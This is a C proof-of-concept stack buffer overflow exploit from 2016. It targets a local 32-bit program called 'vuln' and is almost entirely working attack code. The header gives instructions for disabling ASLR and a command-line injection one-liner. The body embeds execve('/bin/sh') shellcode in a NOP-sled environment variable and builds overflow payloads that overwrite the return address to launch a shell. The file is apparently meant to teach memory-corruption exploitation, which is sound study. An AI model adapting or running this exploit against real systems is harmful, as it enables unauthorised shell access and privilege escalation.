/*G
 * Smash the stack exploit.
 * (C) 2016 nighter 
 * 
 * pOc how to exploit a buffer overflow bug on x86.
 * 
 * Compile with
 *    gcc ./exploit.c -m32 -w -o exploit
 * 
 * Be sure ASLR is turned off.
 *    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 
 *
 * If you rather use the command line injection.
 *
 *     export SHELLCODE=$(python -c 'print "\x90"*100 + "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh"')
 *     vuln $(python -c "print('A' * 40) + 'CCCC'") $(python -c "print('A' * 25) + '\xa7\xb5\xff\xff'")
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUFFER_NAME          41
#define BUFFER_PASSWORD	     31
#define BUFFER		     72
#define RETADDR         0x804c03a
#define NOP             0x90

static char shellcode[] = "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88"
			  "\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e"
			  "\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8"
			  "\xe3\xff\xff\xff/bin/sh";

void banner()
{
   printf("      ▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄\n");
   printf("     █░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄\n");
   printf("    █░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█\n");
   printf("   █░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█\n");
   printf(" ▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█\n");
   printf("█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█\n");
   printf("█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█\n");
   printf(" █░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█\n");
   printf("  █░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█\n");
   printf("   █░░░░██░░▀█▄▄▄█▄▄█▄████░█\n");
   printf("    █░░░░▀▀▄░█░░░█░█▀██████░█\n");
   printf("     ▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█\n");
   printf("       ▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█\n");
   printf("          ▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█\n");
   printf("              ▀▄▄▄▄▄░░░░░░░░█\n");
   printf("\np0c by %s[%s]\n\n","nighter","https://nighter.se");
}


char put_env_shellcode()
{
    char *val = NULL;
    char shell[BUFFER];    

    /* Set LANG to de to easier cause b0f */
    if(setenv("LANG","de",1))
    {
        printf("\n setenv() failed\n");
    	return 1;
    }

    if(setenv("LANG","de",1))
    {
        printf("\n setenv() failed\n");
        return 1;
    }

    /* Put shellcode in enviroment variable */
    memset(shell, NOP, BUFFER);
    memcpy(&shell[BUFFER-strlen(shellcode)],shellcode,strlen(shellcode));
    setenv("SHELLCODE", shell, 1);
    putenv(shell); 

    val = getenv("SHELLCODE");
    printf("shellcode is located at %p\n", val );
}

char *get_env_shellcode_address()
{
   char *addr;
   addr = getenv("SHELLCODE");
   if (addr == NULL)
   {
       printf("The environment variable SHELLCODE doesn't exist.\n");
   }
   else
   {
       return addr;
   }
}

char build_name_payload(char *payload_name)
{
	int i;
	memset(payload_name, '\0', sizeof(payload_name));

	for(i = 0; i < BUFFER_NAME; i++)
        {
            *(payload_name + i) = 0x41;
        }
        return *payload_name;
}

char build_password_payload(char *payload_password)
{
        int i;
        memset(payload_password, '\0', sizeof(payload_password));

        for(i = 0; i < 25; i++)
        {
            *(payload_password + i) = 0x41;
        }

        for(i = 25; i < BUFFER_PASSWORD; i += 4)
	{
                *(long *)&payload_password[i] = get_env_shellcode_address();
	}

        return *payload_password;
}

int main(int argc, char **argv)
{
    char payload_name[BUFFER_NAME];
    char payload_password[BUFFER_PASSWORD];

    banner();
    put_env_shellcode();

    build_name_payload(payload_name);
    build_password_payload(payload_password);    

    execl("./vuln", "vuln" , payload_name, payload_password, NULL);
    return 0;
}
